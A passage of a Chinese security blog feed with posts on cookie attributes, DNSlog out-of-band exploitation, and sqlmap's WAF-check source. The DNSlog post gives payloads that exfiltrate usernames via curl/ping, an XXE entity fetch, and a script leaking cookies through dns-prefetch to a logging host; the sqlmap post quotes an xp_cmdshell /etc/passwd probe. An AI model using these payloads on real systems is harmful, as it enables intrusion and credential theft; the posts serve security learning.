align="left">path</td><td align="left">可选。规定 cookie 的服务器路径。</td></tr><tr><td align="left">domain</td><td align="left">可选。规定 cookie 的域名。</td></tr><tr><td align="left">secure</td><td align="left">可选。规定是否通过安全的HTTPS连接来传输cookie。</td></tr><tr><td align="left">httponly</td><td align="left">可选。当true时cookie仅能通过http协议访问。JS等脚本语言无法访问cookie。</td></tr></tbody></table><ul><li>expire： 指定cookie的过期时间。0或未指定时会默认当前会话为有效期，关闭浏览器后cookie会被清除。 </li><li>path： cookie的有效路径。当设置’/‘时有效路径为根目录，所有根目录和子目录都可以访问；设置为’/shabi/‘时是指只有根目录下的shabi文件夹中的网页和/shabi/下子目录的网页才能访问到 </li></ul><h2 id="0x02-验证cookie属性"><a href="#0x02-验证cookie属性" class="headerlink" title="0x02 验证cookie属性"></a>0x02 验证cookie属性</h2><p>直接访问wo.shabi.com的1.php我们获取到我们的cookie：</p><p><img src="/2020/03/22/Cookie/3.png" alt><br>我们直接在console下面的Application字段可以看到我们的cookie的键和值。我们来具体实验一下其他选项的配置。</p><ul><li>Domain</li></ul><p>Domain我们设置其为shabi.com，即该域名的子域下该cookie仍会存在，我们通过访问ni.shabi.com的2.php，看能否将cookie打印出来：</p><p><img src="/2020/03/22/Cookie/4.png" alt></p><p>可见只要在shabi.com的子域下，子域间的cookie是可以被共享的。</p><ul><li>httponly</li></ul><p>httponly限制了脚本语言对cookie的读取。我们已经写好了js.html，他的内容是console.log(document.cookie)将cookie打印在控制台上。我们访问wo.shabi.com/js.html：</p><p><img src="/2020/03/22/Cookie/5.png" alt></p><p>可见我们的JS不能读取到cookie的内容，该行的结果为空。</p><ul><li>expire</li></ul><p>上面我将expire设置为0，0或者空会将cookie的作用时间设置为该会话。即只要会话结束，cookie就会失效。现在我们的cookie还在作用中：</p><p><img src="/2020/03/22/Cookie/6.png" alt></p><p>然后关闭浏览器后重新访问wo.shabi.com/2.php：</p><p><img src="/2020/03/22/Cookie/7.png" alt></p><p>可以看到我们的cookie数组已经为空了，因为前一个cookie的会话被关闭，导致前一个cookie已经失效。</p><h2 id="0x02-cookie性质"><a href="#0x02-cookie性质" class="headerlink" title="0x02 cookie性质"></a>0x02 cookie性质</h2><ul><li>Cookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。</li><li>客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。</li><li>Cookie是不可跨域名的。域名<a href="http://www.google.com颁发的Cookie不会被提交到域名www.baidu.com去。该性质是由Cookie的隐私安全机制决定的。隐私安全机制能够禁止网站非法获取其他网站的Cookie。" target="_blank" rel="noopener">www.google.com颁发的Cookie不会被提交到域名www.baidu.com去。该性质是由Cookie的隐私安全机制决定的。隐私安全机制能够禁止网站非法获取其他网站的Cookie。</a> </li></ul><blockquote><p>假如现在我有个恶意网站，想诱骗用户点击骗取他在另一个网站的cookie，这是不能做到的。因为他的cookie是在另一个网站，当他访问我们的恶意网站时请求头是不会带上这个跨域的cookie的。这就是XSS跨站的意思，它通过JS的src之类的跨站属性，再搭配对cookie的读取，就能成功让该网站的cookie跨到我们的恶意网站上。</p></blockquote><p><strong>综上，cookie就是把用户状态记录并保存在客户端上来标识用户的字段。具有不可跨域性。</strong></p><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这里只是做了个很简单的实验，其他选项的时候做了但是觉得没必要一直写。这两个兄弟篇主要是为了将cookie和session区分开来。下一篇继续写上session的实验。继续加油吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cookie&quot;&gt;&lt;a href=&quot;#Cookie&quot; class=&quot;headerlink&quot; title=&quot;Cookie&quot;&gt;&lt;/a&gt;Cookie&lt;/h1&gt;&lt;p&gt;拿php做一个简单的实验，分析cookie的各个选项的作用并加深理解。&lt;/p&gt;
&lt;h2 id=&quot;0x00-修
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>DNSlog注入</title>
    <link href="http://bai-ren-1.github.io/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/"/>
    <id>http://bai-ren-1.github.io/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-19T07:10:32.000Z</published>
    <updated>2020-03-21T04:51:39.751Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h1><p>emmm，就写一写DNS log注入吧。有挺多利用方式的，都是为了盲打的效果。只要能在漏洞上通过某些方法<strong>发出一个请求</strong>，就能达成盲打的效果。</p><h2 id="0x00-DNS-log平台"><a href="#0x00-DNS-log平台" class="headerlink" title="0x00 DNS log平台"></a>0x00 DNS log平台</h2><p>这个就详细地介绍一下，首先我们登录到  <a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a>  注册并登录，这个是知道创宇建立的一个平台。具体的使用情况说明在里面可以看到详细的解释。随后我们点开个人信息页面，可以看到有个标识符的字段，这是用来标识你这身份的依据：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/1.png" alt></p><blockquote><p> 对于每个用户，有六个随机字符的唯一标识符代码和唯一子域值，可以在配置文件页面中找到。记录了对该子域及其所有内容的所有DNS查询和HTTP请求。</p><p>例如，<code>b182oj</code>是某人的唯一标识符代码，并且<code>b182oj.ceye.io</code>是他/她的子域。对于所有的DNS quries和HTTP请求<code>b182oj.ceye.io</code>和<code>*.b182oj.ceye.io</code>将被记录。</p></blockquote><p>上面就是关于域名标识的用法解释，很简单明了了，随后我们具体做个简单实验。</p><p>访问<a href="http://dashabi.xxxxx.ceye.io，这里面的DNS解析原理我就不用多说了，不会可以去看计网基础。然后我们就能在查询记录里面看到对应的结果：" target="_blank" rel="noopener">http://dashabi.xxxxx.ceye.io，这里面的DNS解析原理我就不用多说了，不会可以去看计网基础。然后我们就能在查询记录里面看到对应的结果：</a></p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/3.png" alt></p><p>除了DNS查询记录里面的记录，平台还提供了http查询查询功能：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/4.png" alt></p><p>可以看到我们发出了两个http请求，分别请求了网站和网站图标。初步实验结束，平台强大，进入使用。</p><h2 id="0x01-SQL盲注"><a href="#0x01-SQL盲注" class="headerlink" title="0x01 SQL盲注"></a>0x01 SQL盲注</h2><p>如遇到MySql的盲注时，可以利用内置函数<code>load_file()</code>来完成DNSLOG。<strong>load_file()</strong>不仅能够加载本地文件，同时也能对诸如<code>\\www.test.com</code>这样的URL<strong>发起请求</strong>。 </p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/5.png" alt></p><p>基本的表信息结构如上图所示。我们使用DNS log注入需要用到一个重要参数：<code>secure_file_priv</code></p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/6.png" alt></p><blockquote><p>当secure_file_priv为空，就可以读取磁盘的目录。</p><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p><p>当secure_file_priv为null，load_file就不能加载文件。</p><p>具体的配置在 my.ini 中可以进行设置</p></blockquote><p>我将secure_file_priv修改为空，然后可以进入正题了，我们通过下面这种payload：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/9.png" alt></p><blockquote><p>经实验前面不是四个反斜杠会无法得到请求，并且后面不加uri也会得不到请求；</p><p>有选中数据库，但命令行下发不出请求，用sqlyog就能成功发出；</p></blockquote><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/10.png" alt></p><blockquote><p>我们通过load_file发出请求，请求的内容用concat进行拼接：前面四个反斜杠是为了转义成两个斜杠，然后拼上数据库查询，后面就是DNSlog的域名。</p></blockquote><p>相应的我们把想查询的内容放在对应位置即可。</p><h2 id="0x01-无回显命令执行"><a href="#0x01-无回显命令执行" class="headerlink" title="0x01 无回显命令执行"></a>0x01 无回显命令执行</h2><p>命令执行可以通过搭配<strong>curl或者ping发出请求</strong>命令来达成无回显获取信息的目的。</p><p>LINUX平台下payload的形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.ip.port.b182oj.ceye.io</span><br></pre></td></tr></table></figure><p>Windows平台下payload的形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br></pre></td></tr></table></figure><p>附上Windows平台下重要变量的值：</p><table><thead><tr><th>变量</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>%ALLUSERSPROFILE%</td><td>本地</td><td>返回“所有用户”配置文件的位置。</td></tr><tr><td>%APPDATA%</td><td>本地</td><td>返回默认情况下应用程序存储数据的位置。</td></tr><tr><td>%CD%</td><td>本地</td><td>返回当前目录字符串。</td></tr><tr><td>%CMDCMDLINE%</td><td>本地</td><td>返回用来启动当前的 Cmd.exe 的准确命令行。</td></tr><tr><td>%CMDEXTVERSION%</td><td>系统</td><td>返回当前的“命令处理程序扩展”的版本号。</td></tr><tr><td>%COMPUTERNAME%</td><td>系统</td><td>返回计算机的名称。</td></tr><tr><td>%COMSPEC%</td><td>系统</td><td>返回命令行解释器可执行程序的准确路径。</td></tr><tr><td>%DATE%</td><td>系统</td><td>返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</td></tr><tr><td>%ERRORLEVEL%</td><td>系统</td><td>返回上一条命令的错误代码。通常用非零值表示错误。</td></tr><tr><td>%HOMEDRIVE%</td><td>系统</td><td>返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>%HOMEPATH%</td><td>系统</td><td>返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>%HOMESHARE%</td><td>系统</td><td>返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>%LOGONSERVER%</td><td>本地</td><td>返回验证当前登录会话的域控制器的名称。</td></tr><tr><td>%NUMBER_OF_PROCESSORS%</td><td>系统</td><td>指定安装在计算机上的处理器的数目。</td></tr><tr><td>%OS%</td><td>系统</td><td>返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</td></tr><tr><td>%PATH%</td><td>系统</td><td>指定可执行文件的搜索路径。</td></tr><tr><td>%PATHEXT%</td><td>系统</td><td>返回操作系统认为可执行的文件扩展名的列表。</td></tr><tr><td>%PROCESSOR_ARCHITECTURE%</td><td>系统</td><td>返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</td></tr><tr><td>%PROCESSOR_IDENTFIER%</td><td>系统</td><td>返回处理器说明。</td></tr><tr><td>%PROCESSOR_LEVEL%</td><td>系统</td><td>返回计算机上安装的处理器的型号。</td></tr><tr><td>%PROCESSOR_REVISION%</td><td>系统</td><td>返回处理器的版本号。</td></tr><tr><td>%PROMPT%</td><td>本地</td><td>返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</td></tr><tr><td>%RANDOM%</td><td>系统</td><td>返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</td></tr><tr><td>%SYSTEMDRIVE%</td><td>系统</td><td>返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</td></tr><tr><td>%SYSTEMROOT%</td><td>系统</td><td>返回 Windows server operating system 根目录的位置。</td></tr><tr><td>%TEMP%和%TMP%</td><td>系统和用户</td><td>返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</td></tr><tr><td>%TIME%</td><td>系统</td><td>返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。</td></tr><tr><td>%USERDOMAIN%</td><td>本地</td><td>返回包含用户帐户的域的名称。</td></tr><tr><td>%USERNAME%</td><td>本地</td><td>返回当前登录的用户的名称。</td></tr><tr><td>%USERPROFILE%</td><td>本地</td><td>返回当前用户的配置文件的位置。</td></tr><tr><td>%WINDIR%</td><td>系统</td><td>返回操作系统目录的位置。</td></tr></tbody></table><p>做个简单的实验，通过ping命令查询拼接了%USERNAME%的域名，就能通过命令执行获取到主机的用户名信息：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/11.png" alt></p><p>在平台上就能接收到结果了：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/12.png" alt></p><h2 id="0x02-XXE盲打"><a href="#0x02-XXE盲打" class="headerlink" title="0x02 XXE盲打"></a>0x02 XXE盲打</h2><p>直接上payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test"&gt;</span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-绕CSP打XSS拿cookie"><a href="#0x03-绕CSP打XSS拿cookie" class="headerlink" title="0x03 绕CSP打XSS拿cookie"></a>0x03 绕CSP打XSS拿cookie</h2><p>CSP(内容安全策略)是防御XSS最有效的手段之一。当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外，导致此XSS无法利用。对此，我们可以使用DNS预解析突破CSP的阻拦。 </p><blockquote><p> DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术，对于跨站的链接，由于每次都要进行一次DNS解析，会消耗掉很多时间。DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。 </p></blockquote><p>DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。由于<strong>DNS预解析可以绕过CSP进行解析</strong>，结合DNSLOG，我们即可窃取在CSP保护下的Cookie。 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector('body').innerHTML += "<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'dns-prefetch'</span> <span class="attr">href</span>=<span class="string">'" + window.btoa(document.cookie.split(/;|=/)[1]) + ".b182oj.ceye.io'</span>&gt;</span>"</span><br></pre></td></tr></table></figure><blockquote><p> document.querySelector(‘body’)获取文档中 “body” 的元素然后 += 添加上DNS预解析标签；</p><p>预解析标签指向的地址是分割符号后出来的并经过window.btoa进行b64编码的cookie作为二级域名的域名；</p></blockquote><p>上面的Payload将Cookie中截取的重要字段进行简单的base64编码后，作为我们DNSLOG平台的二级域名，并在body中插入了相应的link标签对此域名进行强制DNS预解析。当触发XSS攻击时，可以在Web控制台下看到结 </p><h2 id="0x04-DNS解绑定绕SSRF"><a href="#0x04-DNS解绑定绕SSRF" class="headerlink" title="0x04 DNS解绑定绕SSRF"></a>0x04 DNS解绑定绕SSRF</h2><p>在ceye.io平台上也提供了DNS解绑定的功能。下图是SSRF解绑定攻击流程：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/13.png" alt></p><ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP。</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证。</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li></ul><blockquote><p>攻击点就在于<strong>第二次</strong>服务端发出请求时，我们能通过短时间的ttl来修改返回的地址。因为验证url的操作是在第一步那里，我们给他响应一个外网ip，所以我们能绕过验证。<strong>由于ttl为0，DNS解析结果缓存时间很短</strong>，服务器第二次要请求url的时候就会<strong>重新解析</strong>域名，那这次我们就给他响应个内网ip，就能成功绕过SSRF限制发出到内网的请求了。</p></blockquote><ul><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>DNSlog真的是一个好用的东西，各种无回显漏洞通过搭配发出请求域名的命令就能通过log形式来看到回显的结果。要好好的利用总结。</p><p>参考链接：</p><p> <a href="https://www.freebuf.com/articles/web/135342.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135342.html</a> </p><p> <a href="https://www.freebuf.com/column/184587.html" target="_blank" rel="noopener">https://www.freebuf.com/column/184587.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNSlog注入&quot;&gt;&lt;a href=&quot;#DNSlog注入&quot; class=&quot;headerlink&quot; title=&quot;DNSlog注入&quot;&gt;&lt;/a&gt;DNSlog注入&lt;/h1&gt;&lt;p&gt;emmm，就写一写DNS log注入吧。有挺多利用方式的，都是为了盲打的效果。只要能在漏洞上
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SQLMAP源码分析</title>
    <link href="http://bai-ren-1.github.io/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://bai-ren-1.github.io/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-03-18T06:05:37.000Z</published>
    <updated>2020-04-01T10:43:25.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLMAP源码分析"><a href="#SQLMAP源码分析" class="headerlink" title="SQLMAP源码分析"></a>SQLMAP源码分析</h1><p>实验室面试经典面题，既然科班出身，肯定得好好钻研一下这些工具源码然后自己写或者拓展。</p><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>环境没啥好说的，直接拿自己刚入门时下载的SQLMAP和VSCode一把梭。</p><h2 id="0x01-入口定位"><a href="#0x01-入口定位" class="headerlink" title="0x01 入口定位"></a>0x01 入口定位</h2><p>因为我们使用SQLMAP都是用python指定执行sqlmap.py这个文件，所以没啥好说的，就是从他开始分析。</p><p>直接定位到他的入口函数。可以看到他用异常处理模块写的，那就直接跟进try模块，分析他的调用情况。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png" alt></p><p>emmm，确实写的太具体了，在主方法中还定义了各种异常处理模块。看名称大概就是SQLMAP用户退出异常、SQLMAP的shell异常、SQLMAP基本异常、键盘输入异常和EOF等，暂时先不看吧。</p><p>看他的主模块，我们继续跟进主方法里面的try模块：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2.png" alt></p><p>进到try模块一看就舒服多了，我把最下面的if模块收起来，整个try模块就和清晰明了。很明显一进入了try就执行了这四个处理函数，并且下面的多次使用了 cmdLineOptions、conf变量。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/3.png" alt></p><h3 id="函数dirtyPatches"><a href="#函数dirtyPatches" class="headerlink" title="函数dirtyPatches"></a>函数dirtyPatches</h3><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/3-1.png" alt></p><p>这个函数很明显是在做一些声明和初始化操作：</p><ul><li>声明了httplib的最大值MAXLINE的值</li><li>如果是Windows系统则导入ip地址转换函数模块</li><li>如果字符编码是cp65001则转换为utf-8 </li></ul><blockquote><p>当然这里有个好玩的地方就是他的转换是通过写lambda表达式写的：</p><p>lambda作为一个表达式，定义了一个匿名函数，上例的代码name为参数，name为cp65001则转utf-8 </p></blockquote><h3 id="函数checkEnvironment"><a href="#函数checkEnvironment" class="headerlink" title="函数checkEnvironment"></a>函数checkEnvironment</h3><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/3-2.png" alt></p><p>很贴切函数名，这里就是在做一些环境的检查操作：</p><ul><li>检查模块的路径是否可以找到，拒绝奇怪的编码</li><li>检查python的版本，太老就gg了</li><li>从lib.core.data中导入三个全局变量 <code>conf、kb、cmdLineOptions</code>，有点意思了</li><li>从lib.core.exception中导入几个异常处理类</li></ul><h3 id="函数setPaths"><a href="#函数setPaths" class="headerlink" title="函数setPaths"></a>函数setPaths</h3><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/4.png" alt></p><p>这个函数太长啦，下面还有部分函数，我没截图。大概功能也很明显：就是把各类资源路径加载进去。里面可以看到了包括了<code>WAF、SHELL和各类TXT</code>的路径</p><h4 id="函数banner"><a href="#函数banner" class="headerlink" title="函数banner"></a>函数banner</h4><p>banner信息，没啥好说的，下面继续。</p><h3 id="跟进initOptions"><a href="#跟进initOptions" class="headerlink" title="跟进initOptions"></a>跟进initOptions</h3><p>继续我们的流程，往下走。跟进initOptions函数中。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/5.png" alt></p><p>其中setConfAttributes（配置属性）<code>设置了conf的各项属性</code>：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/6.png" alt></p><blockquote><p>Tips：这里就直接快速查看就行啦，没必要跟进进去。</p></blockquote><p>第二个setKnowledgeBaseAttributes（知识库属性）<code>设置了kb的各项属性</code>：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/7.png" alt></p><p>第三个不说了。这个总的函数initOptions意义在于<code>设置了conf和kb</code>这两个经常会遇到的全局变量的属性，我们可以在这里快速定位到相关信息。下面继续跟进main中的try模块。</p><h3 id="跟进try模块"><a href="#跟进try模块" class="headerlink" title="跟进try模块"></a>跟进try模块</h3><p>继续在try模块跟踪，现在可以展开if模块了（终于），很清晰的看到在init初始化后就开始进入主程序中：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/8.png" alt></p><p>跟进下init发现都是初始操作，这里就不写了。然后他会调用两种测试：smokeTest和liveTest对SQLMAP的功能进行测试。测试完就会导入start方法了，终于看到曙光了。</p><h2 id="0x02-start方法"><a href="#0x02-start方法" class="headerlink" title="0x02 start方法"></a>0x02 start方法</h2><p>vscode直接选中start然后右键“转到定义”，就能直接到了start方法声明的地方：lib/controller/controller.py。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/9.png" alt></p><blockquote><p>稍微翻译一下函数说明：这个函数调用对每个URL是否稳定进行检查，并且对所有的GET，POST，Cookie和User-agent参数检查检查是否可用并且会受SQL注入影响。</p></blockquote><p>可以看到一开始还是通过上一章中初始化出来的conf全局变量进行检查，懒得多说。直接进行到for循环里面进行分析。</p><h3 id="分析循环结构"><a href="#分析循环结构" class="headerlink" title="分析循环结构"></a>分析循环结构</h3><p>现在就可以安心的分析循环中的try模块。第一步我们就看到了打印出检查网络连接状况的消息，不得不说SQLMAP真的考虑的很周全。</p><p>如果不能连通，就输出错误信息。连不通就一直….下去。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/10.png" alt></p><p>第二步就开始给conf变量进行赋值。赋值了目标URL，请求方法，请求数据，cookie各类http请求头。然后下面好多配置的东西哟例如<code>parseTargetUr</code>l和<code>setupTargetEnv</code>等，我真服了，直接看到<code>checkWaf</code>函数吧。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/11.png" alt></p><h2 id="0x03-start中的checkWaf"><a href="#0x03-start中的checkWaf" class="headerlink" title="0x03 start中的checkWaf"></a>0x03 start中的checkWaf</h2><p>OK，这个可以看出他先检查了一下该目标是否有检测过Waf，没有的话就会开始检查Waf。简略的看一下就如同下图：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/12.png" alt></p><p>随后就会初始化两个变量，一个是<code>retVal=0</code>，用于标识是否存在Waf。另一个是<code>payload</code>，由随机数字和内置payload组合而成。</p><blockquote><p>SQLMAP内置的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u&apos;5856 AND 1=1 UNION ALL SELECT 1,NULL,&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;,table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(\&apos;cat ../../../etc/passwd\&apos;)#&apos;</span><br></pre></td></tr></table></figure></blockquote><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/13.png" alt></p><p>可以看出首先根据两种请求方式，分别构造出 <code>随机字符参数 = 刚刚组合而成的payload</code> 形式的请求参数，然后把我们的目标的信息写入<code>kb</code>中。</p><p>然后通过<code>queryPage</code>发送，假如出现SQLMAP连接错误，则说明存在Waf，把retVal设置为1并进入下面的if中。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/14.png" alt></p><p>if中很明显就是打印出存在Waf并且简单和你交互是否继续检查。并把该网站存在Waf写进db中。</p><blockquote><p>下一次检查Waf就能直接判断这个网站有Waf，即开头检查的那部分，这也是SQLMAP厉害之处。</p></blockquote><h3 id="queryPage"><a href="#queryPage" class="headerlink" title="queryPage"></a>queryPage</h3><p>那么，在上面的流程中，我们能大概断定他关于Waf的判断存在于<code>queryPage</code>这一句，我们仔细看一下。其实上图中我截图并不完全，完整的语句如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = Request.queryPage(place=place, value=value, getRatioValue=<span class="literal">True</span>, noteResponseTime=<span class="literal">False</span>, silent=<span class="literal">True</span>, disableTampering=<span class="literal">True</span>)[<span class="number">1</span>] &lt; IDS_WAF_CHECK_RATIO</span><br></pre></td></tr></table></figure><p>首先这里retVal是由一个判断式子来决定的，若后面式子为真，则为1；否则为0。如下图所示：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/16.png" alt></p><p>其中<code>IDS_WAF_CHECK_RATIO</code>的值为0.5，这个是什么呢？首先介绍diff模块：</p><blockquote><p>difflib模块是在 SQLMAP 中用来计算页面的相似度的基础模块，实际处理的时候，SQLMAP 并不仅仅是直接计算页面的相似度，而是通过首先对页面进行一些预处理，预处理之后，根据预设的阈值来计算请求页面和模版页面的相似度。实际使用中，最多的方法应该就是 <code>ratio()</code>。 </p></blockquote><p>关于ratio的用法如下图所示：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/18.png" alt></p><p>现在我们知道了SQLMAP使用的判断页面相似的方法，我们就继续回到原来的判断Waf的语句中。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/15.png" alt></p><p>这个式子代表，只要加上了payload发送的请求和正常发送的请求的相似度只要小于0.5，就会被判定为存在Waf。</p><p>OK，那我们看看queryPage的函数说明：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/17.png" alt></p><blockquote><p>此方法调用函数来获取目标URL的页面内容并返回其相似度（0&lt;=相似度&lt;=1）或者返回一个代表获取不了相似度的布尔值。</p></blockquote><p>到此我们就把checkWaf的基本轮廓描述了一遍，下面做一个简单的总结：</p><blockquote><p>checkWaf先检查原有数据中是否存在目标网址的Waf信息。若不存在Waf信息，则初始化敏感payload并拼接成参数形式。不同的请求方法（GET/POST）就把上面内容插入不同的地方。然后SQLMAP发送请求，并通过difflib库判断加上参数后与原来是否相似度小于0.5，如果是，则返回存在Waf。打印出相应信息并返回主流程。</p></blockquote><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>我去，写了这么久，还比较浅显才到了检查Waf这一步。后面再把后面内容补上来吧，太多了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQLMAP源码分析&quot;&gt;&lt;a href=&quot;#SQLMAP源码分析&quot; class=&quot;headerlink&quot; title=&quot;SQLMAP源码分析&quot;&gt;&lt;/a&gt;SQLMAP源码分析&lt;/h1&gt;&lt;p&gt;实验室面试经典面题，既然科班出身，肯定得好好钻研一下这些工具源码然后自己写或
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JS原型污染链</title>
    <link href="http://bai-ren-1.github.io/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/"/>
